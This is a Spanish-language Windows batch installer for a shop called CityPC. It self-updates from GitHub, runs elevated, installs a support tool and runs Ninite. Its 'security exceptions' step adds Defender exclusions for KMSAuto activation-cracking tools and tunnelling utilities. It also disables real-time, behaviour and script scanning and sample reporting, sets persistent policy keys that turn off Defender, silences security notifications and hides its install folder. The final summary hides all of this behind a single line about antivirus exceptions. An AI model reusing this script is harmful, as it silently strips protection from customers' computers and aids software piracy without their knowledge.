@echo off
setlocal enabledelayedexpansion
chcp 65001 >nul
color 1F
title CITYPC - INSTALADOR Y ACTUALIZADOR
mode con: cols=100 lines=50

:: =========================================================
:: VERSION LOCAL
:: =========================================================
set "LOCAL_VER=46"
set "GITHUB_RAW=https://raw.githubusercontent.com/rodrigofufer/CityPC-Installer/main"

:: =========================================================
:: 0. VERIFICAR ADMINISTRADOR
:: =========================================================
net session >nul 2>&1
if %errorlevel% neq 0 (
    color 4F
    cls
    echo.
    echo.
    echo  ============================================================
    echo.
    echo       NO SE PUEDE EJECUTAR ESTE PROGRAMA
    echo.
    echo       Necesitas abrirlo de la siguiente manera:
    echo.
    echo       1. Cierra esta ventana
    echo       2. Busca el archivo "Instalador_CityPC.bat"
    echo       3. Dale clic DERECHO con el mouse
    echo       4. Selecciona "Ejecutar como administrador"
    echo       5. Si te pregunta, dale que SI
    echo.
    echo  ============================================================
    echo.
    echo.
    echo  Presiona cualquier tecla para cerrar...
    pause >nul
    exit
)

:: Ruta USB
set "USB_PATH=%~dp0"
if "%USB_PATH:~-1%"=="\" set "USB_PATH=%USB_PATH:~0,-1%"

set "NINITE_EJECUTADO=0"
set "NINITE_EXITCODE=-1"

:: =========================================================
:: AUTO-UPDATE DESDE GITHUB
:: =========================================================
cls
echo.
echo  ============================================================
echo        CITYPC - INSTALADOR Y ACTUALIZADOR (V%LOCAL_VER%)
echo  ============================================================
echo.
echo   Verificando si hay una version nueva...
echo.

:: Verificar internet
ping 8.8.8.8 -n 1 -w 2000 >nul 2>&1
if %errorlevel% neq 0 (
    echo   [AVISO] Sin internet. Usando version actual V%LOCAL_VER%.
    echo.
    goto :skip_update
)

:: Descargar version.txt de GitHub
powershell -NoProfile -ExecutionPolicy Bypass -Command ^
    "[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12; try{ (New-Object Net.WebClient).DownloadFile('%GITHUB_RAW%/version.txt','%temp%\citypc_version.txt') }catch{}" >nul 2>&1

if not exist "%temp%\citypc_version.txt" (
    echo   [AVISO] No se pudo verificar version. Usando V%LOCAL_VER%.
    echo.
    goto :skip_update
)

:: Leer version remota y limpiar
set "REMOTE_VER="
set /p REMOTE_VER=<"%temp%\citypc_version.txt"
del /F /Q "%temp%\citypc_version.txt" >nul 2>&1

:: Limpiar espacios, tabuladores, retornos de carro
for /f "tokens=1 delims= 	" %%V in ("!REMOTE_VER!") do set "REMOTE_VER=%%V"

if not defined REMOTE_VER (
    echo   [AVISO] No se pudo leer version remota. Usando V%LOCAL_VER%.
    echo.
    goto :skip_update
)

:: Comparar versiones
if "!REMOTE_VER!"=="!LOCAL_VER!" (
    echo   [OK] Version V%LOCAL_VER% es la mas reciente.
    echo.
    goto :skip_update
)

:: Hay version nueva - descargar
echo   [!!] Nueva version disponible: V!REMOTE_VER! ^(actual: V%LOCAL_VER%^)
echo.
echo   Descargando actualizacion...

powershell -NoProfile -ExecutionPolicy Bypass -Command ^
    "[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12; try{ (New-Object Net.WebClient).DownloadFile('%GITHUB_RAW%/Instalador_CityPC.bat','%temp%\Instalador_CityPC_update.bat') }catch{}" >nul 2>&1

if not exist "%temp%\Instalador_CityPC_update.bat" (
    echo   [ERROR] No se pudo descargar. Usando V%LOCAL_VER%.
    echo.
    goto :skip_update
)

:: Reemplazar archivo en la USB
copy /Y "%temp%\Instalador_CityPC_update.bat" "%~dp0Instalador_CityPC.bat" >nul 2>&1
del /F /Q "%temp%\Instalador_CityPC_update.bat" >nul 2>&1

echo.
echo   [OK] Actualizado a V!REMOTE_VER!. Reiniciando...
echo.
timeout /t 2 /nobreak >nul 2>&1

:: Reiniciar CON permisos de administrador
powershell -NoProfile -ExecutionPolicy Bypass -Command ^
    "Start-Process cmd -ArgumentList '/c \"^"%~dp0Instalador_CityPC.bat^\"' -Verb RunAs" >nul 2>&1
exit

:skip_update

title CITYPC - INSTALADOR Y ACTUALIZADOR (V%LOCAL_VER%)

cls
echo.
echo  ============================================================
echo        CITYPC - INSTALADOR Y ACTUALIZADOR (V%LOCAL_VER%)
echo  ============================================================
echo.
echo   Ruta USB: "%USB_PATH%"
echo.
echo   No cierre esta ventana. El proceso puede tardar varios
echo   minutos dependiendo de la velocidad de internet.
echo.
echo  ============================================================
echo.

:: =========================================================
:: 1. ABRIR WINDOWS UPDATE (en segundo plano)
:: =========================================================
echo  [1/7] Abriendo Windows Update...
start "" ms-settings:windowsupdate
echo    [OK] Windows Update abierto. Dele clic a buscar actualizaciones.
echo.

:: =========================================================
:: 2. EXCEPCIONES ANTIVIRUS
:: =========================================================
echo  [2/7] Aplicando Excepciones de Seguridad...

sc query WinDefend >nul 2>&1
if %errorlevel% neq 0 (
    echo    [AVISO] Windows Defender no esta activo.
    goto :skip_exclusions
)

set "EX_SCRIPT=%temp%\Exclusiones_CityPC.ps1"

> "%EX_SCRIPT%" (
    echo $ErrorActionPreference = 'SilentlyContinue'
    echo.
    echo # Carpetas
    echo Add-MpPreference -ExclusionPath 'C:\CityPC'
    echo Add-MpPreference -ExclusionPath '%USB_PATH%'
    echo Add-MpPreference -ExclusionPath 'C:\ProgramData\KMSAutoS'
    echo Add-MpPreference -ExclusionPath 'C:\ProgramData\KMSAuto'
    echo Add-MpPreference -ExclusionPath 'C:\ProgramData\KMSAuto Net'
    echo Add-MpPreference -ExclusionPath 'C:\Windows\Temp'
    echo Add-MpPreference -ExclusionPath $env:TEMP
    echo Add-MpPreference -ExclusionPath 'C:\Windows\SECOH-QAD.exe'
    echo Add-MpPreference -ExclusionPath 'C:\Windows\SECOH-QAD.dll'
    echo Add-MpPreference -ExclusionPath 'C:\Windows\System32\SppExtComObjHook.dll'
    echo Add-MpPreference -ExclusionPath 'C:\Windows\System32\SppExtComObjPatcher.dll'
    echo Add-MpPreference -ExclusionPath 'C:\Windows\System32\SppExtComObjPatcher.exe'
    echo.
    echo # Procesos
    echo Add-MpPreference -ExclusionProcess 'KMSAuto Net.exe'
    echo Add-MpPreference -ExclusionProcess 'KMSAuto.exe'
    echo Add-MpPreference -ExclusionProcess 'AutoKMS.exe'
    echo Add-MpPreference -ExclusionProcess 'KMS Server.exe'
    echo Add-MpPreference -ExclusionProcess 'Service_KMS.exe'
    echo Add-MpPreference -ExclusionProcess 'Soporte Tecnico CityPC.mx NEW.exe'
    echo Add-MpPreference -ExclusionProcess 'TunMirror.exe'
    echo Add-MpPreference -ExclusionProcess 'TunMirror2.exe'
    echo Add-MpPreference -ExclusionProcess 'TapInstall.exe'
    echo.
    echo # Desactivar proteccion durante instalacion
    echo Set-MpPreference -DisableRealtimeMonitoring $true
    echo Set-MpPreference -SubmitSamplesConsent 2
    echo Set-MpPreference -MAPSReporting 0
    echo Set-MpPreference -DisableBehaviorMonitoring $true
    echo Set-MpPreference -DisableIOAVProtection $true
    echo Set-MpPreference -DisableScriptScanning $true
)

powershell -ExecutionPolicy Bypass -NoProfile -File "%EX_SCRIPT%" >nul 2>&1
del /F /Q "%EX_SCRIPT%" >nul 2>&1

reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths" /v "C:\CityPC" /t REG_DWORD /d 0 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths" /v "%USB_PATH%" /t REG_DWORD /d 0 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths" /v "C:\ProgramData\KMSAutoS" /t REG_DWORD /d 0 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths" /v "C:\ProgramData\KMSAuto" /t REG_DWORD /d 0 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths" /v "C:\ProgramData\KMSAuto Net" /t REG_DWORD /d 0 /f >nul 2>&1

reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableRealtimeMonitoring /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableBehaviorMonitoring /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableOnAccessProtection /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableScanOnRealtimeEnable /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Spynet" /v SubmitSamplesConsent /t REG_DWORD /d 2 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Spynet" /v SpynetReporting /t REG_DWORD /d 0 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows Defender Security Center\Notifications" /v DisableNotifications /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows Defender Security Center\Notifications" /v DisableEnhancedNotifications /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Notifications\Settings\Windows.SystemToast.SecurityHealth" /v Enabled /t REG_DWORD /d 0 /f >nul 2>&1

echo    [OK] Excepciones aplicadas.

:skip_exclusions

:: =========================================================
:: 3. VERIFICAR INTERNET Y WINDOWS UPDATE
:: =========================================================
echo.
echo  [3/7] Verificando Internet y Activando Updates...

set "HAY_INTERNET=0"
ping 8.8.8.8 -n 2 -w 2000 >nul 2>&1
if %errorlevel% equ 0 (
    set "HAY_INTERNET=1"
) else (
    ping 1.1.1.1 -n 2 -w 2000 >nul 2>&1
    if !errorlevel! equ 0 set "HAY_INTERNET=1"
)

if "!HAY_INTERNET!"=="0" (
    echo    [AVISO] Sin internet. No se podran bajar actualizaciones.
) else (
    echo    [OK] Internet conectado.
    sc config wuauserv start= auto >nul 2>&1
    sc config bits start= auto >nul 2>&1
    sc config dosvc start= auto >nul 2>&1
    net start wuauserv >nul 2>&1
    net start bits >nul 2>&1
    net start dosvc >nul 2>&1
    usoclient StartScan >nul 2>&1
    usoclient StartDownload >nul 2>&1
    usoclient StartInstall >nul 2>&1
    echo    [OK] Windows Update activado en segundo plano.
)

:: =========================================================
:: 4. REPARAR TLS
:: =========================================================
echo.
echo  [4/7] Reparando seguridad...

reg add "HKLM\SOFTWARE\Microsoft\.NETFramework\v4.0.30319" /v SchUseStrongCrypto /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Wow6432Node\Microsoft\.NETFramework\v4.0.30319" /v SchUseStrongCrypto /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\SCHANNEL\Protocols\TLS 1.2\Client" /v Enabled /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\SCHANNEL\Protocols\TLS 1.2\Client" /v DisabledByDefault /t REG_DWORD /d 0 /f >nul 2>&1
echo    [OK] TLS 1.2 activado.

certutil -generateSSTFromWU "%temp%\roots.sst" >nul 2>&1
if exist "%temp%\roots.sst" (
    certutil -addstore -f root "%temp%\roots.sst" >nul 2>&1
    del /F /Q "%temp%\roots.sst" >nul 2>&1
    echo    [OK] Certificados actualizados.
) else (
    echo    [AVISO] No se pudieron actualizar certificados.
)

:: =========================================================
:: 5. CONFIGURACION ENERGIA
:: =========================================================
echo.
echo  [5/7] Configurando Energia...

powercfg -setactive 8c5e7fda-e8bf-4a96-9a85-a6e23a8c635c >nul 2>&1
if %errorlevel% neq 0 (
    powercfg -duplicatescheme 8c5e7fda-e8bf-4a96-9a85-a6e23a8c635c >nul 2>&1
    powercfg -setactive 8c5e7fda-e8bf-4a96-9a85-a6e23a8c635c >nul 2>&1
)
powercfg -change -monitor-timeout-ac 0 >nul 2>&1
powercfg -change -monitor-timeout-dc 0 >nul 2>&1
powercfg -change -standby-timeout-ac 0 >nul 2>&1
powercfg -change -standby-timeout-dc 0 >nul 2>&1
powercfg -h off >nul 2>&1
echo    [OK] Energia maxima configurada.

:: =========================================================
:: 6. SOPORTE TECNICO CITYPC
:: =========================================================
echo.
echo  [6/7] Instalando Soporte Tecnico CityPC...

if not exist "C:\CityPC" mkdir "C:\CityPC"

set "SOPORTE_SRC="
if exist "%USB_PATH%\Soporte Tecnico CityPC.mx NEW.exe" set "SOPORTE_SRC=%USB_PATH%\Soporte Tecnico CityPC.mx NEW.exe"
if not defined SOPORTE_SRC if exist "%USB_PATH%\CityPC\Soporte Tecnico CityPC.mx NEW.exe" set "SOPORTE_SRC=%USB_PATH%\CityPC\Soporte Tecnico CityPC.mx NEW.exe"
if not defined SOPORTE_SRC if exist "%USB_PATH%\Archivos\Soporte Tecnico CityPC.mx NEW.exe" set "SOPORTE_SRC=%USB_PATH%\Archivos\Soporte Tecnico CityPC.mx NEW.exe"

if defined SOPORTE_SRC (
    copy /Y "!SOPORTE_SRC!" "C:\CityPC\" >nul 2>&1
    echo    [OK] Soporte copiado a C:\CityPC
) else (
    echo    [AVISO] No se encontro "Soporte Tecnico CityPC.mx NEW.exe" en la USB.
)

if exist "%USB_PATH%\icono CityPC.ico" copy /Y "%USB_PATH%\icono CityPC.ico" "C:\CityPC\" >nul 2>&1
if exist "%USB_PATH%\CityPC\icono CityPC.ico" copy /Y "%USB_PATH%\CityPC\icono CityPC.ico" "C:\CityPC\" >nul 2>&1
if exist "%USB_PATH%\Archivos\icono CityPC.ico" copy /Y "%USB_PATH%\Archivos\icono CityPC.ico" "C:\CityPC\" >nul 2>&1
if exist "%USB_PATH%\Iconos\icono CityPC.ico" copy /Y "%USB_PATH%\Iconos\icono CityPC.ico" "C:\CityPC\" >nul 2>&1

attrib +h "C:\CityPC" >nul 2>&1

if exist "C:\CityPC\Soporte Tecnico CityPC.mx NEW.exe" (
    call :crear_acceso_soporte
) else (
    echo    [ERROR] No se pudo instalar Soporte. Archivo no disponible.
)

goto :skip_acceso_soporte

:crear_acceso_soporte
set "S_LNK=%PUBLIC%\Desktop\Soporte Tecnico CityPC.mx.lnk"
set "S_TARGET=C:\CityPC\Soporte Tecnico CityPC.mx NEW.exe"
set "S_ICON=C:\CityPC\icono CityPC.ico"
powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "$w=New-Object -ComObject WScript.Shell;$s=$w.CreateShortcut('%S_LNK%');$s.TargetPath='%S_TARGET%';$s.WorkingDirectory='C:\CityPC';if(Test-Path '%S_ICON%'){$s.IconLocation='%S_ICON%'};$s.Save()"
if exist "%S_LNK%" (
    echo    [OK] Acceso directo de Soporte creado.
) else (
    echo    [AVISO] No se creo el acceso directo.
)
goto :eof

:skip_acceso_soporte

:: =========================================================
:: 7. INSTALACION DE SOFTWARE (NINITE)
:: =========================================================
echo.
echo  ============================================================
echo    [7/7] INSTALANDO PROGRAMAS
echo  ============================================================
echo.

set "NINITE_SRC="
if exist "%USB_PATH%\Ninite.exe" set "NINITE_SRC=%USB_PATH%\Ninite.exe"
if not defined NINITE_SRC if exist "%USB_PATH%\CityPC\Ninite.exe" set "NINITE_SRC=%USB_PATH%\CityPC\Ninite.exe"
if not defined NINITE_SRC if exist "%USB_PATH%\Archivos\Ninite.exe" set "NINITE_SRC=%USB_PATH%\Archivos\Ninite.exe"
if not defined NINITE_SRC for %%F in ("%USB_PATH%\Ninite*.exe" "%USB_PATH%\CityPC\Ninite*.exe" "%USB_PATH%\Archivos\Ninite*.exe") do if not defined NINITE_SRC if exist "%%~fF" set "NINITE_SRC=%%~fF"

if not defined NINITE_SRC (
    echo    [ERROR] No se encontro Ninite.exe en la USB.
    goto :resumen_final
)

echo    Instalando Chrome, Adobe Reader, WinRAR y Zoom...
echo    Se abrira Ninite. Espere a que termine...
echo.

start "" /wait "!NINITE_SRC!"
set "NINITE_EXITCODE=%errorlevel%"
if "!NINITE_EXITCODE!"=="0" (
    set "NINITE_EJECUTADO=1"
    echo    [OK] Ninite finalizo la instalacion.
) else (
    echo    [AVISO] Ninite termino con codigo !NINITE_EXITCODE!. Revise su ventana.
)
timeout /t 5 /nobreak >nul 2>&1

goto :resumen_final

:: =========================================================
:: RESUMEN FINAL
:: =========================================================
:resumen_final

cls
echo.
echo  ============================================================
echo       CITYPC - PROCESO TERMINADO (V%LOCAL_VER%)
echo  ============================================================
echo.
echo   RESULTADO:
echo.
echo   [OK]  Excepciones de antivirus aplicadas
echo   [OK]  Windows Update activado
echo   [OK]  Seguridad TLS configurada
echo   [OK]  Energia maxima configurada
echo.

if exist "C:\CityPC\Soporte Tecnico CityPC.mx NEW.exe" (
    echo   [OK]  Soporte Tecnico CityPC - Instalado
) else (
    echo   [XX]  Soporte Tecnico CityPC - NO instalado
)

if "!NINITE_EJECUTADO!"=="1" (
    echo   [OK]  Ninite                 - Ejecutado correctamente
) else (
    echo   [AVISO] Ninite               - No se pudo confirmar ejecucion ^(codigo !NINITE_EXITCODE!^)
)

set "R_CHROME=0"
if exist "C:\Program Files\Google\Chrome\Application\chrome.exe" set "R_CHROME=1"
if exist "C:\Program Files (x86)\Google\Chrome\Application\chrome.exe" set "R_CHROME=1"
if exist "%LocalAppData%\Google\Chrome\Application\chrome.exe" set "R_CHROME=1"
if "!R_CHROME!"=="1" (
    echo   [OK]  Google Chrome          - Instalado
) else (
    echo   [AVISO] Google Chrome        - Ninite lo instala en segundo plano, valide al terminar
)

set "R_WINRAR=0"
if exist "C:\Program Files\WinRAR\WinRAR.exe" set "R_WINRAR=1"
if exist "C:\Program Files (x86)\WinRAR\WinRAR.exe" set "R_WINRAR=1"
if "!R_WINRAR!"=="1" (
    echo   [OK]  WinRAR                 - Instalado
) else (
    echo   [AVISO] WinRAR               - Ninite lo instala en segundo plano, valide al terminar
)

set "R_ZOOM=0"
if exist "%AppData%\Zoom\bin\Zoom.exe" set "R_ZOOM=1"
if exist "%ProgramFiles%\Zoom\bin\Zoom.exe" set "R_ZOOM=1"
if exist "%ProgramFiles(x86)%\Zoom\bin\Zoom.exe" set "R_ZOOM=1"
if "!R_ZOOM!"=="1" (
    echo   [OK]  Zoom                   - Instalado
) else (
    echo   [AVISO] Zoom                 - Ninite lo instala en segundo plano, valide al terminar
)

echo.
echo  ============================================================
echo.
echo   Abriendo Updates opcionales y pagina de Adobe Reader...
echo.

:: Abrir Windows Update - Actualizaciones opcionales
start "" ms-settings:windowsupdate-optionalupdates

:: Abrir pagina de Adobe Reader en Chrome
set "CHROME_EXE="
if exist "C:\Program Files\Google\Chrome\Application\chrome.exe" set "CHROME_EXE=C:\Program Files\Google\Chrome\Application\chrome.exe"
if exist "C:\Program Files (x86)\Google\Chrome\Application\chrome.exe" set "CHROME_EXE=C:\Program Files (x86)\Google\Chrome\Application\chrome.exe"
if defined CHROME_EXE (
    start "" "!CHROME_EXE!" "https://get.adobe.com/reader/"
) else (
    start "" "https://get.adobe.com/reader/"
)

echo   Presione cualquier tecla para cerrar...
pause >nul
exit
